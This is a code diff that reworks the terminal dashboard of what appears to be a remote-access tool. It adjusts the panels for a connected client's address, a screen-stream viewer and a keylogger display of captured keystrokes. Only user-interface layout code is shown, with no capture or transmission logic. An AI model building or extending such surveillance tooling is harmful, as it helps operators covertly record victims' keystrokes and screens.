@@ -149,14 +149,14 @@ fn draw_first_tab(frame: &mut Frame, app: &mut App, area: Rect) {
         ))
         .style(Style::default().bg(Color::Rgb(10, 10, 18)));
 
-    let client_lines = if !app.addr.is_empty() {
-        let (ip, port1) = app.addr
+    let client_lines = if !app.addr1.is_empty() {
+        let (ip, port1) = app.addr1
             .rsplit_once(':')
-            .unwrap_or((&app.addr, "?"));
+            .unwrap_or((&app.addr1, "?"));
 
-        let (_, port2) = app.img_addr
+        let (_, port2) = app.addr2
             .rsplit_once(':')
-            .unwrap_or((&app.img_addr, "?"));
+            .unwrap_or((&app.addr2, "?"));
 
         vec![
             Line::from(Span::raw("")),
@@ -207,12 +207,19 @@ fn draw_first_tab(frame: &mut Frame, app: &mut App, area: Rect) {
 }
 
 fn draw_second_tab(frame: &mut Frame, app: &mut App, area: Rect) {
-    let chunks = Layout::vertical([
-        Constraint::Fill(4),
-        Constraint::Length(1), 
-        Constraint::Fill(1),
+    let outer = Layout::vertical([
+        Constraint::Length(8),
+        Constraint::Fill(1), 
     ])
     .split(area);
+
+    let top_row = Layout::horizontal([
+        Constraint::Fill(1), 
+        Constraint::Fill(4), 
+    ])
+    .split(outer[0]);
+
+    let stream_active = !app.addr2.is_empty();
 
     let screen_block = Block::default()
         .borders(Borders::ALL)
@@ -225,36 +232,68 @@ fn draw_second_tab(frame: &mut Frame, app: &mut App, area: Rect) {
         ))
         .style(Style::default().bg(Color::Rgb(10, 10, 18)));
 
-    let placeholder_lines = vec![
-        Line::from(""),
-        Line::from(vec![
-            Span::raw("  "),
-            Span::styled(
-                "[ no screen capture available ]",
-                Style::default().fg(Color::Rgb(50, 50, 80)),
+    let placeholder_lines = if stream_active {
+        vec![
+            Line::from(""),
+            Line::from(""),
+            Line::from(vec![
+                Span::styled(
+                    "   press F1 to open    ",
+                    Style::default()
+                        .fg(Color::Rgb(10, 10, 18))
+                        .bg(Color::Rgb(0, 200, 160))
+                        .add_modifier(Modifier::BOLD),
+                ),
+            ]),
+            Line::from(
+                Span::styled(
+                    "     the viewer        ",
+                    Style::default()
+                        .fg(Color::Rgb(10, 10, 18))
+                        .bg(Color::Rgb(0, 200, 160))
+                        .add_modifier(Modifier::BOLD),
+                ),
             ),
-        ]),
-        Line::from(vec![
-            Span::raw("  "),
-            Span::styled(
-                "waiting for stream...",
-                Style::default().fg(Color::Rgb(40, 40, 65)),
-            ),
-        ]),
-    ];
+        ]
+    } else {
+        vec![
+            Line::from(""),
+            Line::from(""),
+            Line::from(vec![
+                Span::styled(
+                    " waiting for stream...",
+                    Style::default().fg(Color::Rgb(40, 40, 65)),
+                ),
+            ]),
+        ]
+    };
 
     let user_screen = Paragraph::new(placeholder_lines)
-        .block(screen_block.clone())
+        .block(screen_block)
         .style(Style::default().bg(Color::Rgb(10, 10, 18)));
 
-    frame.render_widget(user_screen, chunks[0]);
-    frame.render_stateful_widget(StatefulImage::new(), screen_block.inner(chunks[0]), &mut app.screenshot.protocol);
+    frame.render_widget(user_screen, top_row[0]);
 
-    let sep = Paragraph::new(Line::from(Span::styled(
-        "─".repeat(area.width as usize),
-        Style::default().fg(Color::Rgb(30, 30, 55)),
-    )));
-    frame.render_widget(sep, chunks[1]);
+    let info_block = Block::default()
+        .borders(Borders::ALL)
+        .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
+        .title(Span::styled(
+            " ▸ SESSION INFO ",
+            Style::default()
+                .fg(Color::Rgb(0, 200, 160))
+                .add_modifier(Modifier::BOLD),
+        ))
+        .style(Style::default().bg(Color::Rgb(10, 10, 18)));
+
+    let info_lines = vec![
+        Line::from(""),
+    ];
+
+    let info_panel = Paragraph::new(info_lines)
+        .block(info_block)
+        .style(Style::default().bg(Color::Rgb(10, 10, 18)));
+
+    frame.render_widget(info_panel, top_row[1]);
 
     let key_display = if app.logged_keys.is_empty() {
         vec![Line::from(Span::styled(
@@ -283,7 +322,8 @@ fn draw_second_tab(frame: &mut Frame, app: &mut App, area: Rect) {
 
     let keylogger = Paragraph::new(key_display)
         .block(keylogger_block);
-    frame.render_widget(keylogger, chunks[2]);
+
+    frame.render_widget(keylogger, outer[1]);
 }
 
 fn draw_third_tab(frame: &mut Frame, app: &mut App, area: Rect) {
